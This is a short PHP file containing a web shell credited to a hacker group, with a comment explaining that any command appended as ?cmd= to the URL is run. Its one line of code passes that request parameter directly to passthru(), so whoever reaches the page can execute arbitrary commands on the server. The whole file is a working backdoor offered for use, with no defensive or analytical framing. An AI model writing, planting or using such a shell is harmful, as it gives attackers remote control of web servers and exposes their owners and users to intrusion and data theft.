/*
	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,

	to use it just add ?cmd=[command] at the end of the link.
	Example:
	https://example.com/g.php?cmd=ls
	(c) Wh1t3R0s3
*/
<?php echo passthru($_GET['cmd']); _halt_compiler(); ?>
